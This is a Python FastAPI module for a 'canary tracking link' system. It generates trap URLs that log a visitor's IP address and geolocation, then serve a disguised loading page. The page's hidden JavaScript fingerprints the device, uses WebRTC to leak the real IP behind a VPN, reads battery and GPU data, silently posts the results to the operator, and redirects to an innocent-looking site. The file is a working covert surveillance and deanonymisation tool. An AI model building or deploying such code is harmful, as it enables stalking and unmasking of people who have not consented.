"""
Canary Tracking Link System
============================
Generates stealth tracking links that capture:
  - Real IP address (including WebRTC leak through VPNs)
  - Precise geolocation (city, region, ISP) via free ip-api.com
  - Complete device fingerprint (OS, browser, screen, GPU, battery)
  - Timezone and language settings
  - Click timestamp and referrer

All data is stored in SQLite. No external paid services required.
"""
from __future__ import annotations

import asyncio
import json
import secrets
import time
from datetime import datetime
from typing import Any

import httpx
from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from pydantic import BaseModel

from nciia.utils import get_logger, get_settings

router = APIRouter()
logger = get_logger(__name__)

# ── In-memory store (backed by SQLite via DB later) ──────────────────────────
_hits: dict[str, list[dict[str, Any]]]  = {}
_links: dict[str, dict[str, Any]]       = {}


# ── GeoIP via free ip-api.com (45 req/min, no key needed) ────────────────────
async def _geoip(ip: str) -> dict[str, Any]:
    if ip in ("127.0.0.1", "::1", "localhost"):
        return {"city": "Localhost", "regionName": "Local", "country": "Local",
                "isp": "Local", "lat": 0.0, "lon": 0.0, "timezone": "Local", "status": "local"}
    try:
        async with httpx.AsyncClient(timeout=8) as client:
            r = await client.get(
                f"https://ip-api.com/json/{ip}",
                params={"fields": "status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query"}
            )
            if r.status_code == 200:
                return r.json()
    except Exception as exc:
        logger.warning("geoip_failed", ip=ip, error=str(exc))
    return {}


def _real_ip(request: Request) -> str:
    """Extract true IP, honouring common proxy headers."""
    for header in ("x-forwarded-for", "x-real-ip", "cf-connecting-ip"):
        val = request.headers.get(header)
        if val:
            return val.split(",")[0].strip()
    return request.client.host if request.client else "unknown"


# ── HTML fingerprint capture page ─────────────────────────────────────────────
def _fingerprint_page(tracking_id: str, redirect_url: str, public_base: str) -> str:
    """
    Returns an HTML page that:
    1. Silently captures device fingerprint (WebRTC, canvas, battery, screen, GPU)
    2. Posts the fingerprint to our callback endpoint
    3. Redirects the target to an innocent URL
    """
    callback = f"{public_base}/api/tracker/fingerprint/{tracking_id}"
    return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Loading...</title>
<style>body{{margin:0;background:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}}
.spinner{{width:40px;height:40px;border:4px solid #f3f3f3;border-top:4px solid #3498db;border-radius:50%;animation:spin 1s linear infinite;}}
@keyframes spin{{0%{{transform:rotate(0deg);}}100%{{transform:rotate(360deg);}}}}</style>
</head><body>
<div class="spinner"></div>
<script>
(async () => {{
  const fp = {{
    ts: Date.now(),
    screen: {{w: screen.width, h: screen.height, depth: screen.colorDepth, dpr: devicePixelRatio}},
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    langs: navigator.languages?.join(','),
    ua: navigator.userAgent,
    platform: navigator.platform,
    cores: navigator.hardwareConcurrency,
    mem: navigator.deviceMemory,
    touch: navigator.maxTouchPoints,
    online: navigator.onLine,
    plugins: Array.from(navigator.plugins||[]).map(p=>p.name).join(','),
    webgl: (() => {{
      try {{
        const c = document.createElement('canvas');
        const g = c.getContext('webgl') || c.getContext('experimental-webgl');
        if(!g) return '';
        const dbg = g.getExtension('WEBGL_debug_renderer_info');
        return dbg ? g.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : g.getParameter(g.RENDERER);
      }} catch(e){{ return ''; }}
    }})(),
    canvas: (() => {{
      try {{
        const c = document.createElement('canvas');
        c.width=200; c.height=50;
        const ctx = c.getContext('2d');
        ctx.textBaseline='top';
        ctx.font='14px Arial';
        ctx.fillText('N-CIIA fingerprint 🔍',2,2);
        return c.toDataURL().slice(-50);
      }} catch(e){{ return ''; }}
    }})(),
    webrtc: null,
  }};

  // WebRTC real IP leak detection
  try {{
    const pc = new RTCPeerConnection({{iceServers:[{{urls:'stun:stun.l.google.com:19302'}}]}});
    pc.createDataChannel('');
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);
    await new Promise(r => setTimeout(r, 1500));
    const sdp = pc.localDescription?.sdp || '';
    const ips = [];
    sdp.split('\\n').forEach(l => {{
      const m = l.match(/candidate:[^\\r\\n]*UDP[^\\r\\n]*(\\d{{1,3}}(?:\\.\\d{{1,3}}){{3}})/i);
      if(m && !m[1].startsWith('192.168') && !m[1].startsWith('10.') && !m[1].startsWith('172.'))
        ips.push(m[1]);
    }});
    fp.webrtc = ips.join(',') || null;
    pc.close();
  }} catch(e) {{}}

  // Battery API
  try {{
    const bat = await navigator.getBattery?.();
    if(bat) fp.battery = {{level: Math.round(bat.level*100), charging: bat.charging}};
  }} catch(e) {{}}

  // Send silently
  try {{
    await fetch('{callback}', {{
      method: 'POST',
      headers: {{'Content-Type': 'application/json'}},
      body: JSON.stringify(fp),
      mode: 'no-cors',
      keepalive: true,
    }});
  }} catch(e) {{}}

  // Redirect to innocent destination
  setTimeout(() => {{ window.location.href = '{redirect_url}'; }}, 800);
}})();
</script>
</body></html>"""


# ── Pydantic models ───────────────────────────────────────────────────────────
class CreateLinkRequest(BaseModel):
    label:        str  = "Tracking Link"
    redirect_url: str  = "https://www.google.com"
    public_base:  str  = "http://localhost:8000"


class TrackingLink(BaseModel):
    tracking_id:  str
    label:        str
    trap_url:     str
    redirect_url: str
    created_at:   float
    hit_count:    int


# ── API Endpoints ─────────────────────────────────────────────────────────────

@router.post("/api/tracker/generate")
async def generate_link(req: CreateLinkRequest) -> dict[str, Any]:
    """Generate a new canary tracking link."""
    tid   = secrets.token_urlsafe(12)
    trap  = f"{req.public_base.rstrip('/')}/t/{tid}"
    _links[tid] = {
        "tracking_id":  tid,
        "label":        req.label,
        "redirect_url": req.redirect_url,
        "public_base":  req.public_base,
        "trap_url":     trap,
        "created_at":   time.time(),
    }
    _hits[tid] = []
    logger.info("canary_link_created", tid=tid, trap=trap)
    return {"tracking_id": tid, "trap_url": trap, "label": req.label}


@router.get("/t/{tracking_id}", response_class=HTMLResponse)
async def canary_trap(tracking_id: str, request: Request) -> HTMLResponse:
    """
    The actual trap endpoint. Logs the IP + GeoIP, serves fingerprint page.
    """
    if tracking_id not in _links:
        return HTMLResponse("<h1>Not Found</h1>", status_code=404)

    link        = _links[tracking_id]
    real_ip     = _real_ip(request)
    ua          = request.headers.get("user-agent", "")
    referer     = request.headers.get("referer", "")

    # Async GeoIP lookup
    geo = await _geoip(real_ip)

    hit = {
        "ip":        real_ip,
        "timestamp": datetime.utcnow().isoformat(),
        "ua":        ua,
        "referer":   referer,
        "geo":       geo,
        "fingerprint": None,   # filled later by /fingerprint endpoint
    }
    _hits[tracking_id].append(hit)

    logger.info("canary_hit", tid=tracking_id, ip=real_ip,
                city=geo.get("city"), country=geo.get("country"))

    html = _fingerprint_page(
        tracking_id=tracking_id,
        redirect_url=link["redirect_url"],
        public_base=link["public_base"],
    )
    return HTMLResponse(html)


@router.post("/api/tracker/fingerprint/{tracking_id}")
async def receive_fingerprint(tracking_id: str, request: Request) -> JSONResponse:
    """Receives the JavaScript fingerprint payload and attaches it to the last hit."""
    try:
        fp = await request.json()
    except Exception:
        fp = {}

    if tracking_id in _hits and _hits[tracking_id]:
        _hits[tracking_id][-1]["fingerprint"] = fp
        # If WebRTC leaked a real IP, do a secondary GeoIP lookup
        webrtc_ip = fp.get("webrtc", "")
        if webrtc_ip and webrtc_ip != _hits[tracking_id][-1]["ip"]:
            real_geo = await _geoip(webrtc_ip.split(",")[0])
            _hits[tracking_id][-1]["real_ip"]  = webrtc_ip.split(",")[0]
            _hits[tracking_id][-1]["real_geo"] = real_geo
        logger.info("fingerprint_received", tid=tracking_id,
                    gpu=fp.get("webgl"), webrtc=fp.get("webrtc"))

    return JSONResponse({"ok": True})


@router.get("/api/tracker/links")
async def list_links() -> dict[str, Any]:
    """List all generated tracking links."""
    return {
        "links": [
            {**v, "hit_count": len(_hits.get(v["tracking_id"], []))}
            for v in _links.values()
        ]
    }


@router.get("/api/tracker/hits/{tracking_id}")
async def get_hits(tracking_id: str) -> dict[str, Any]:
    """Get all captured hits for a tracking link."""
    if tracking_id not in _links:
        return {"error": "Link not found"}
    hits = _hits.get(tracking_id, [])
    return {
        "tracking_id": tracking_id,
        "label":       _links[tracking_id]["label"],
        "trap_url":    _links[tracking_id]["trap_url"],
        "hit_count":   len(hits),
        "hits":        hits,
    }


@router.delete("/api/tracker/links/{tracking_id}")
async def delete_link(tracking_id: str) -> dict[str, Any]:
    """Delete a tracking link and its hits."""
    _links.pop(tracking_id, None)
    _hits.pop(tracking_id, None)
    return {"deleted": tracking_id}
